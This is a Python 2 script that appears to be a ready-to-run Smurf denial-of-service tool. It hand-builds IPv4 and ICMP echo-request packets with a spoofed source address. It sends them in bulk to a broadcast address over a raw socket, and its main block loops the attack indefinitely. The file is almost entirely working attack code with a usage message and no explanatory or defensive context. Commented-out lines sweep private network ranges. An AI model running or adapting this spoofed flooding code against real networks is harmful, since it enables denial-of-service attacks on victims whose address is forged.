import socket
import sys
# from scapy.all import *
# from scapy.layers.inet import *
from scapy.layers.l2 import arping


def IPHeader(source, destination, proto):
    packet = b''
    packet += b'\x45'  # Version (IPv4) + Internet Protocol header length
    packet += b'\x00'  # no quality of service
    packet += b'\x00\x54'  # Total frame length
    packet += b'\x23\x2c'  # Id of this packet
    packet += b'\x40'  # Flags (Don't Fragment)
    packet += b'\x00'  # Fragment offset: 0
    packet += b'\x40'  # Time to live: 64
    packet += proto  # Protocol: ICMP (1)
    packet += b'\x0a\x0a'  # Checksum (python does the work for us)
    packet += socket.inet_aton(source)  # Set source IP to the supplied one
    packet += socket.inet_aton(destination)  # Set destination IP to the supplied one
    return packet


def CreateICMPRequest():
    packet = b''
    packet += b'\x08'  # ICMP Type:8 (icmp echo request)
    packet += b'\x00'  # Code 0 (no code)
    packet += b'\xbd\xcb'  # Checksum
    packet += b'\x16\x4f'  # Identifier (big endian representation)
    packet += b'\x00\x01'  # Sequence number (big endian representation)
    packet += b'\x92\xde\xe2\x50\x00\x00\x00\x00\xe1\xe1\x0e\x00\x00\x00\x00\x00\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37'  # Data (56 bytes)
    return packet


def smurfattack(values):
    # a = arping('192.168.0.0/16', verbose=0)
    # # a = arping('172.20.0.0/16', verbose=0)
    # for i in a[0]:
    try:
        icmpsocket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        icmpsocket.bind(('', 1))
        icmpsocket.setblocking(0)
        icmpsocket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        icmpsocket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    except socket.error:
        print "You need to be root!"
        sys.exit(0)

    # send icmp echo request to supplied destination address with spoofed source address
    try:
        icmpsocket.connect((values[2], 1))  # i[0].pdst
        counter = 1
        print "sending %d icmp echo requests to %s with %s as source" % (
        int(values[3]), values[2], values[1])  # i[0].pdst
        try:
            while counter <= int(values[3]):
                # send_packet(i[0].pdst)
                icmpsocket.send(
                    str(IPHeader(values[1], values[2], proto=b'\x01')) + str(CreateICMPRequest()))  # i[0].pdst
                counter = int(counter) + 1
        except KeyboardInterrupt:
            print 'Keyboard Interrupt'
            icmpsocket.close()
        icmpsocket.close()
    except IndexError:
        help_smurfattack()
        sys.exit(0)


def help_smurfattack():
    print "Usage: smurfattack <source IP> <broadcast address> <number of requests> "


if __name__ == "__main__":
    values = sys.argv
    while True:
        smurfattack(values)
